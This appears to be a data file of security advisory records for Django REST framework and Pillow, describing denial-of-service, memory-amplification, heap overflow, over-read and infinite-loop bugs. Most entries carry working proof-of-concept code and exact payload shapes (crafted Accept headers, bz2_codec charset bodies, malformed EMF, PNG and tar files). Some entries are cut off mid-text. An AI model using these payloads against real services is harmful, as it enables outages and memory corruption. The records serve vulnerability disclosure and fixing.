items.summary: SummaryDRF's content negotiation parses each Accept token several times per request and never limits the number of tokens or their total size. Each parse ends up in Django's parse_header_parameters, which takes quadratic time when a quoted parameter value is packed with semicolons. On my machine a single GET with a 780KB Accept header made of 96 such tokens kept one gunicorn worker busy for 18.87 seconds (Django 6.1, djangorestframework 3.18.0, gunicorn 26.0.0, Python 3.13, Docker on macOS). The header is syntactically valid, fits inside gunicorn's default header limits, and needs no authentication. Two concurrent requests, which is one per sync worker, made a default two worker deployment stop answering for my whole 40 second test window. It recovered half a second after I stopped sending.DetailsWhat happensget_accept_list() splits the Accept header on commas with no cap on token count or total size, at rest_framework/negotiation.py:96-97.For every token, select_renderer() calls media_type_matches() once per renderer, and each call builds fresh _MediaType objects for both sides, at rest_framework/negotiation.py:53-56 and rest_framework/utils/mediatypes.py:22-23. _MediaType.__init__ calls django.utils.http.parse_header_parameters unconditionally, at rest_framework/utils/mediatypes.py:47.When nothing matches, DRF raises NotAcceptable (406). Rendering that error response also needs a renderer, so finalize_response() runs the entire negotiation a second time through perform_content_negotiation(force=True), at rest_framework/views.py:434-437.With the default two renderers this comes to about six parses per Accept token per request. I confirmed the count by instrumenting _MediaType with a counter: six per token, three from the normal pass and three from the forced re-negotiation.The quadratic part is on the Django side. parse_header_parameters splits parameters with _parseparam, which handles quoted values by recounting the quote characters from the start of the string for every candidate separator, the s.count('"', 0, end) calls in django/utils/http.py. A quoted value holding k semicolons costs roughly k rescans over k characters, so a single ~8KB value takes about 31ms per parse here.Numbers from my runs, measured as utime+stime deltas of the server process:one token, ~9KB: 230ms server CPU24 tokens, 216KB: 5.07s on runserver, which has no per field limit48 tokens, 432KB: 10.08s on runserver96 tokens, 780KB: 18.87s under gunicorn defaultsWall time matched CPU time in every run, so this is pure CPU work. RSS stayed flat at 57MB throughout, this is a time attack and not a memory one.A few details that matter for reproducing it:Django rejects a single media type string longer than 10,000 chars (MAX_HEADER_LENGTH), so each token has to stay just under that. Going over gives you a ValueError and a 500, which is a different and much weaker problem.gunicorn defaults are limit_request_field_size 8190 and limit_request_fields 100, so the working shape is 96 separate Accept fields with one ~8.1KB token each. That puts the single request ceiling near 19s, below the default 30s worker timeout, so one request alone does not get a stock gunicorn worker killed by the arbiter. It does not need to. Each request pins one sync worker for its full duration, so on two workers, two held connections wedge the service.order_by_precedence collects tokens into a set, so identical tokens collapse and the cost mostly disappears. Each token needs its own parameter name, x0=, x1=, x2= and so on.Where a fix could go, either of these alone would be enough:Parse each Accept token once per request and reuse the result in the matching loop and in the 406 re-negotiation.Put an aggregate budget in get_accept_list(), say 8KB total or 64 tokens, and treat anything past it as not acceptable.The quadratic behavior itself lives in Django's parser, but DRF is the one calling it six times per token with no cap on how many tokens there are, so both fixes look like DRF changes to me.PoCVerified end to end on Docker Desktop for macOS (Apple Silicon, 8 cores), python:3.13-slim image, Django 6.1, djangorestframework 3.18.0, gunicorn 26.0.0. Nothing was configured beyond defaults.Minimal target, any default DRF project works, this is the one I used.requirements.txt:django==6.1djangorestframework==3.18.0gunicorn==26.0.0pocproj/settings.py:SECRET_KEY = 'poc'; DEBUG = False; ALLOWED_HOSTS = ['*']INSTALLED_APPS = ['django.contrib.contenttypes', 'django.contrib.auth', 'rest_framework']ROOT_URLCONF = 'pocproj.urls'; WSGI_APPLICATION = 'pocproj.wsgi.application'DATABASES = {'default': {'ENGINE': 'django.db.backends.sqlite3', 'NAME': ':memory:'}}USE_TZ = Truepocproj/api.py:from rest_framework.views import APIViewfrom rest_framework.response import Responseclass Items(APIView):    def get(self, request):        return Response([{'id': 1, 'name': 'ok'}])pocproj/urls.py:from django.urls import pathfrom .api import Itemsurlpatterns = [path('items/', Items.as_view())]Star

items.title: [djangorestframework] Django REST framework: JSONParser applies an attacker-named codec to the request stream
items.summary: SummaryAn unauthenticated attacker can defeat Django's DATA_UPLOAD_MAX_MEMORY_SIZE limit and force aworker process to allocate arbitrary memory, by naming a compression codec in the Content-Typecharset parameter. A 108-byte request body produces a 50,331,648-character value inside the view, anamplification factor of 466,033, and grows process peak RSS by about 97 MiB. No applicationconfiguration is required beyond DRF's default parser set; the endpoint only has to accept a JSONbody.DetailsJSONParser.parse decodes the request body with the charset the client supplied on the Content-Typeheader:# rest_framework/parsers.pyencoding = parser_context.get('encoding', settings.DEFAULT_CHARSET)try:    decoded_stream = codecs.getreader(encoding)(stream)    parse_constant = json.strict_constant if self.strict else None    return json.load(decoded_stream, parse_constant=parse_constant)except ValueError as exc:    raise ParseError('JSON parse error - %s' % str(exc))Of the roughly 455 codec names codecs.lookup resolves on CPython 3.14, about 18 are byte transformsinstead of character sets: bz2_codec, zlib_codec, base64_codec, hex_codec, quopri_codec,uu_codec and similar. codecs.getreader is the only entry point in the codecs module that doesnot consult CodecInfo._is_text_encoding, so it accepts all of them. SendingContent-Type: application/json; charset=bz2_codec wraps the request stream in a bz2 decompressorbefore json.load reads it.The ordering is what makes this exploitable. Django charges DATA_UPLOAD_MAX_MEMORY_SIZE against thebytes that arrived on the wire: rest_framework/request.py hands JSONParser anio.BytesIO(self.body), and HttpRequest.body is where _check_data_too_big() runs. Decompressionhappens afterwards, inside the parser, where nothing is counting.This is DRF's defect and not Django's. Django resolves the charset parameter and assignsrequest.encoding, and codecs.lookup does resolve byte transforms, but every Django consumer ofrequest.encoding goes through the text-codec API and fails closed. Both bytes.decode('bz2_codec')and str(raw, 'bz2_codec') raiseLookupError: 'bz2_codec' is not a text encoding; use codecs.decode() to handle arbitrary codecs.DRF is the only caller that hands the request stream to codecs.getreader.FormParser (parsers.py:84) and MultiPartParser (parsers.py:104-118) take the same client-namedencoding but fail closed instead of amplifying.The sink was introduced by 9a228116 (PR #5147, 2017-05-24, "Improve memory footprint when readinglarge JSON requests"), first released in 3.6.4. The final comment on that PR observes the intendedmemory gain does not hold because read() decodes the whole stream, which is the same property thatmakes this expansion unbounded. No _is_text_encoding check has been added since.A one-line fix at parsers.py:61-64:if not codecs.lookup(encoding)._is_text_encoding:    raise ParseError('Unsupported charset in Content-Type')PoCSave as poc_charset_amplification.py and run it. It builds its own payloads, runs each arm in afresh subprocess (peak RSS is a high-water mark, so measuring several arms in one process reportsnear-zero growth for every arm after the first), and prints a verdict.#!/usr/bin/env python"""django-rest-framework: JSONParser applies an attacker-named codec to the requeststream, defeating DATA_UPLOAD_MAX_MEMORY_SIZE.Four arms, each in a fresh subprocess because peak RSS is a high-water mark andmeasuring several arms in one process reports ~0 growth for every arm after thefirst.  T   ~108-byte bz2 body, Content-Type: application/json; charset=bz2_codec  C1  48 MiB plaintext,   Content-Type: application/json   (no charset)  C2  the byte-identical T body, charset=utf-8  C3  zlib body, charset=zlib_codecThe claim is T AND C1 AND C2. C1 proves the size limit is live; C2 proves thecodec name and not the payload is what produces the expansion.Requires: django, djangorestframework importable. No arguments, nothing to edit.    python poc_charset_amplification.pyExit status 0 means every arm behaved as described in the advisory."""import hashlibimport jsonimport osimport subprocessimport sysimport tempfilePAYLOAD_CHARS = 48 * 1024 * 1024PAYLOAD_DIR = os.path.join(tempfile.gettempdir(), "drf-charset-amp")LIMIT = 65536ARMS = {    "T": ("bz2.bin", "application/json; charset=bz2_codec"),    "C1": ("plain.bin", "application/json"),    "C2": ("bz2.bin", "application/json; charset=utf-8"),    "C3": ("zlib.bin", "application/json; charset=zlib_codec"),}EXPECTED = {    "T": "HTTP 200, parsed value orders of magnitude larger than the wire bytes",    "C1": "rejected with RequestDataTooBig, view body never runs",    "C2": "HTTP 400 ParseError on the byte-identical compressed body",    "C3": "HTTP 200, same expansion under a different codec name",}VIEW_RAN = []def build_payloads():    import bz2    import zlib    os.makedirs(PAYLOAD_DIR, exist_ok=True)    plain = b'{"a":"' + b"A" * PAYLOAD_CHARS + b'"}'    blobs = {        "plain.bin": plain,        "bz2.bin": bz2.compress(plai

items.title: [Pillow] Pillow: Heap buffer overflow writing JPEG comment after ICC profile fills buffer
items.summary: ============================================================================Heap buffer overflow writing JPEG comment after ICC profile fills bufferLocation: src/libImaging/JpegEncode.c:330  in ImagingJpegEncode()Commit:   a707c6b21c313880d0771e54965d142dd42358b6============================================================================A heap buffer overflow in Pillow's JPEG encoder lets anyone who can supply an image write up to 64 KB of bytes they choose, followed by the rest of the compressed image, past the end of a 64 KB heap buffer. The target is any application that re-saves the image as JPEG while keeping its colour profile. The reliable result is that the Python process is killed outright rather than raising an exception. Because the overwritten memory sits directly in front of function pointers that the encoder calls next, this could allow code execution, though the attached reproducer demonstrates only the crash.The bug is in ImagingJpegEncode() in src/libImaging/JpegEncode.c. State 4 (line 330) calls jpeg_write_marker() for the COM comment marker without checking that the output buffer has room. Meanwhile, JpegImagePlugin._save() sizes that buffer from the EXIF and ICC/XMP data only and reserves nothing for the comment. When a 65498-byte ICC profile fills the 65536-byte buffer exactly, libjpeg's emit_byte() stores one byte past the end and then decrements free_in_buffer from 0. The size_t counter wraps, so the marker, the comment and the entire compressed image are written out of bounds.Triggering it takes only a valid JPEG (or PNG) carrying that profile and any comment, passed through Image.open() and then im.save(..., "JPEG", icc_profile=im.info.get("icc_profile")). That is the documented way to preserve colour. The comment is forwarded from im.info automatically, and no non-default setting is involved.The attached reproducer re-saves such a file on the stock build, and the process dies with SIGSEGV. An identical file without the comment saves normally. An ASan build of Pillow will not flag this, because the stray writes happen inside the system libjpeg-turbo. Valgrind does report it, as an invalid write immediately after the 65569-byte allocation.The unguarded call was introduced in e50ae85ea406 ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0.DetailsImagingJpegEncode() (src/libImaging/JpegEncode.c) is a resumable state machine that fills a caller-supplied output buffer of bytes bytes and returns when it is full. State 4 writes the JPEG COM marker with jpeg_write_marker() without first checking that the buffer has any room left. When the preceding state 3 — the verbatim copy of the "extra" APP segments (ICC profile / XMP) — ends exactly at the last byte of the buffer, jpeg_write_marker() is entered with free_in_buffer == 0. libjpeg's emit_byte() stores the byte first and tests --free_in_buffer == 0 afterwards, so the size_t counter wraps to 2^64-1 instead of triggering the "buffer full" path, and the 4-byte marker header, the whole comment, and then (state 5) the DQT/SOF/DHT/SOS headers and the entire entropy-coded image are written linearly past the end of the 65536-byte heap buffer allocated in src/encode.c.A JPEG laid out asFFD8                                   SOIFFE2 <len> "ICC_PROFILE\0" 01 01 <65498 bytes>     -> im.info["icc_profile"]FFFE <len> <comment, any length 1..65533>           -> im.info["comment"]<any baseline RGB JPEG body>opened with Image.open() and re-saved with the usual colour-profile-preserving callim.save(out, "JPEG", icc_profile=im.info.get("icc_profile"))kills the Python process on the stock build at this commit: glibc aborts with realloc(): invalid next size / corrupted size vs. prev_size, or the process takes SIGSEGV inside jpeg_write_marker/jpeg_write_scanlines. Stopping at JpegEncode.c:330 in gdb shows next_output_byte - buf == 65536, free_in_buffer == 0, comment_size == 65533 before the call, and next_output_byte - buf == 131073, free_in_buffer == 18446744073709486079 after it — 65537 bytes already written beyond a 65536-byte buffer before a single scanline has been encoded. An ASan build of Pillow does not flag this, because the out-of-bounds stores happen inside the (uninstrumented) system libjpeg-turbo; valgrind does, reporting Invalid write ... 0 bytes after a block of size 65,569 from jpeg_write_marker called at JpegEncode.c:330 before aborting on the corrupted heap metadata.Code pathThe buffer. JpegImagePlugin._save() sizes the encoder buffer from the metadata it is about to emit, allowing one spare byte after the extra block and nothing for the comment:# src/PIL/JpegImagePlugin.py:859-862    else:        # The EXIF info needs to be written as one block, + APP1, + one spare byte.        # Ensure that our buffer is big enough. Same with the icc_profile block.        bufsize = max(len(exif) + 5, len(extra) + 1)ImageFile._save() then takes max(MAXBLOCK, bufsize, width*4) (src/PIL/ImageFile.py:662, MAXBLOCK = 65536), and _en

items.title: [Pillow] Pillow: Heap over-read in WMF/EMF rendering via 16-bit dimension truncation (Windows builds)
items.summary: SummaryOn Windows builds, Pillow stores EMF and WMF image dimensions without a range check and passes them to the native drawwmf handler. That code sizes its allocation from dimensions truncated into 16-bit header fields but copies the result using the full 32-bit dimensions. A crafted metafile that is wide and short passes the decompression-bomb pixel check yet causes a heap over-read.DetailsThe EMF branch computes the size straight from signed 32-bit header fields and stores it with no positivity or range check:src/PIL/WmfImagePlugin.py:121-129 reads the bounding box; :148 stores it; the size reaches the native handler through src/PIL/WmfImagePlugin.py:56.In the native handler the DIB header fields bcWidth and bcHeight are 16-bit and truncate the allocation, while the copy length uses the untruncated ints:src/display.c:793-794 assign the 16-bit fieldssrc/display.c:800 sizes the allocation from themsrc/display.c:827 copies height * ((width * 3 + 3) & -4) bytes using the full valuesThe whole handler is compiled only on Windows (#ifdef _WIN32, src/display.c:33-841).PoCimport structfrom PIL import Imagedef L(v):    return struct.pack("<i", v)# Minimal EMF header. Bounding box is 70000 x 1, so the pixel count (70000) passes the# decompression-bomb check, but the width truncates to 16 bits for the allocation while# the copy uses 70000.emf  = b"\x01\x00\x00\x00" + L(88)          # record type + sizeemf += L(0) + L(0) + L(70000) + L(1)        # rclBounds: x0, y0, x1, y1emf += L(0) + L(0) + L(100) + L(100)        # rclFrame (non-zero, used for the dpi calc)emf += b" EMF"                              # signature at offset 40emf += bytes(44)open("poc.emf", "wb").write(emf)im = Image.open("poc.emf")print("size:", im.size, "pixels:", im.size[0] * im.size[1])im.load()                                   # over-read happens here on a Windows buildOn Linux the first part is observable: the 88-byte file opens, size is (70000, 1), and the bomb check passes. The native over-read only exists on Windows because Image.core.drawwmf is compiled out elsewhere (on Linux im.load() raises OSError instead).ImpactCWE-125, out-of-bounds read in a C extension on Windows builds. A crafted EMF or WMF that passes the pixel check can read past a heap buffer, leaking memory or crashing the process.Referenceshttps://github.com/python-pillow/Pillow/security/advisories/GHSA-9v9v-9qvf-h2hjhttps://nvd.nist.gov/vuln/detail/CVE-2026-96644https://github.com/python-pillow/Pillow/pull/10120https://github.com/python-pillow/Pillow/commit/4cf46bee338304c5c8968fd7f132ba0d40c428b7https://github.com/python-pillow/Pillow/releases/tag/13.0.0https://github.com/advisories/GHSA-9v9v-9qvf-h2hj

items.title: [Pillow] Pillow: PNG eXIf chunk makes EXIF parsing run in quadratic time
items.summary: Summary  A PNG file with a large eXIf chunk full of repeated 6-byte markers makes Pillow's EXIF parser take seconds of CPU instead of milliseconds. The cost grows with the square of the chunk size, so a normal small-photo-sized file is enough to cause real delay.Details  Exif.load() in src/PIL/Image.py strips a marker from the start of the EXIF data like this:while data and data.startswith(b"Exif\x00\x00"):    data = data[6:]  Each pass makes a new copy of the remaining data. A real camera writes this marker once, so this is not normally a problem.  chunk_eXIf() in src/PIL/PngImagePlugin.py puts the raw PNG eXIf chunk straight into info["exif"] with no size limit and no check of its content. PNG text chunks (tEXt, zTXt, iTXt) are capped with MAX_TEXT_CHUNK and MAX_TEXT_MEMORY. The eXIf chunk has no such cap.  If the eXIf chunk is filled with repeated Exif\x00\x00 markers instead of real EXIF data, the strip loop runs once per marker, copying a large buffer each time. This is a classic quadratic time bug.Steps to reproduce  This builds a small PNG in memory and times Image.open().getexif() on it. No external file needed.import timefrom io import BytesIOfrom PIL import Image, PngImagePlugindef chunk(cid, *data):    fp = BytesIO()    PngImagePlugin.putchunk(fp, cid, *data)    return fp.getvalue()MAGIC = PngImagePlugin._MAGICIHDR = chunk(b"IHDR", PngImagePlugin.o32(1), PngImagePlugin.o32(1), b"\x08\x02", b"\0\0\0")IDAT = chunk(b"IDAT")IEND = chunk(b"IEND")marker = b"Exif\x00\x00"exif_chunk = chunk(b"eXIf", marker * 300_000)  # 1.8MB, all markersdata = MAGIC + IHDR + exif_chunk + IDAT + IENDstart = time.time()with Image.open(BytesIO(data)) as im:    im.getexif()print("took", time.time() - start, "seconds")  Expected output on a fixed version: well under 0.1 seconds, the same as a normal file this size.  Actual output on the current code: around 3.5 to 3.7 seconds, for a single 1.8MB file. We checked with a prohis time is spent inside the strip loop itself, not somewhere else. We also checked the growth rate across a  few sizes (200KB, 600KB, 1.2MB, 1.8MB) and it matches quadratic growth closely, not linear.  A pytest version of this test, using pytest-timeout so a test run does not hang if the bug is present, is  it fails with Failed: Timeout (>2.0s) from pytest-timeout.import pytestfrom io import BytesIOfrom PIL import Image, PngImagePlugindef chunk(cid, *data):    fp = BytesIO()    PngImagePlugin.putchunk(fp, cid, *data)    return fp.getvalue()MAGIC = PngImagePlugin._MAGICIHDR = chunk(b"IHDR", PngImagePlugin.o32(1), PngImagePlugin.o32(1), b"\x08\x02", b"\0\0\0")IDAT = chunk(b"IDAT")IEND = chunk(b"IEND")@pytest.mark.timeout(2)def test_exif_load_is_not_quadratic():    marker = b"Exif\x00\x00"    exif_chunk = chunk(b"eXIf", marker * 300_000)    data = MAGIC + IHDR + exif_chunk + IDAT + IEND    with Image.open(BytesIO(data)) as im:        im.getexif()ImpactAvailability: an attacker who can get one PNG file processed can burn several seconds of CPU per request w A bigger file scales worse, since the cost is quadratic, not linear.Confidentiality: none.Integrity: none.This fires through Image.getexif(), Image._getexif(), and ImageOps.exif_transpose(). exif_transpose() is the function Pillow's own docs recommend for auto-rotating user photos, so this can hit normal upload handling code, not just an unusual call.Referenceshttps://github.com/python-pillow/Pillow/security/advisories/GHSA-g4qv-2jxx-769hhttps://nvd.nist.gov/vuln/detail/CVE-2026-96643https://github.com/python-pillow/Pillow/pull/10073https://github.com/python-pillow/Pillow/commit/806e38381c781f32bbd22f4cd026678acd40fd6chttps://github.com/python-pillow/Pillow/releases/tag/13.0.0https://github.com/advisories/GHSA-g4qv-2jxx-769h

items.title: [Pillow] Pillow: TarIO negative size field causes infinite CPU-spin loop
items.summary: SummaryTarIO.__init__ does not check that a tar header's size field is positive. A crafted header with a negative size makes it seek backward onto itself. This causes an infinite loop that uses 100% CPU and never returns.DetailsTarIO.__init__ reads 512-byte tar headers one at a time, looking for a member with a given name. For each header it reads the size field and skips ahead to the next header:size = int(s[124:135], 8)...self.fh.seek((size + 511) & (~511), io.SEEK_CUR)There is no check that size is zero or more. A tar header can set this field to a negative octal value. For size = -512, the seek offset comes out to exactly -512, which cancels the 512 bytes the loop had just read. The file position goes right back to where this loop step started.The loop only stops on end of file or when a header name starts with a null byte. Neither happens, since the same header keeps showing up again. The loop never ends on its own.Steps to reproduceThis uses Tests/images/hopper.tar, a normal file already in the Pillow test suite. It only changes the size field of the first header.from PIL import TarIOwith open("Tests/images/hopper.tar", "rb") as f:    data = bytearray(f.read())# Set the size field (bytes 124 to 135) to a negative octal value.# Octal 1000 is 512, so this is size = -512.data[124:135] = b"  -00001000"with open("poisoned.tar", "wb") as f:    f.write(data)# "does-not-exist" does not match the header name, so TarIO must# keep scanning. This call never returns.TarIO.TarIO("poisoned.tar", "does-not-exist")We confirmed this with ps. The process sits at 98 to 100% CPU and never exits on its own. It only stops if killed from outside.A pytest version of this, using pytest-timeout so the test does not hang forever, is below. On the current code it fails with Failed: Timeout (>3.0s) from pytest-timeout.from __future__ import annotationsfrom pathlib import Pathimport pytestfrom PIL import TarIOSOURCE_TAR = "Tests/images/hopper.tar"@pytest.mark.timeout(3)def test_negative_size_field_does_not_hang(tmp_path: Path) -> None:    with open(SOURCE_TAR, "rb") as f:        data = bytearray(f.read())    data[124:135] = b"  -00001000"  # octal 1000 = decimal 512, negated    poisoned_tar = tmp_path / "poisoned.tar"    poisoned_tar.write_bytes(data)    with pytest.raises((OSError, ValueError)):        with TarIO.TarIO(str(poisoned_tar), "does-not-exist"):            passImpactAvailability: an attacker who can get a crafted tar file passed to TarIO.TarIO() can hang the process at full CPU with a file just over 512 bytes.Confidentiality: none.Integrity: none.TarIO is a small helper class. It is not used by Image.open() and is not on the default path most Pillow users hit. An app has to call PIL.TarIO.TarIO(path, member_name) directly for this to matter, which some apps do to read an image out of a tar archive.Referenceshttps://github.com/python-pillow/Pillow/security/advisories/GHSA-3j72-p6qg-6xp7https://nvd.nist.gov/vuln/detail/CVE-2026-96642https://github.com/python-pillow/Pillow/pull/10012https://github.com/python-pillow/Pillow/commit/19b695fdcc5eddc37374e2b1645fc4185edaf71dhttps://github.com/python-pillow/Pillow/releases/tag/13.0.0https://github.com/advisories/GHSA-3j72-p6qg-6xp7
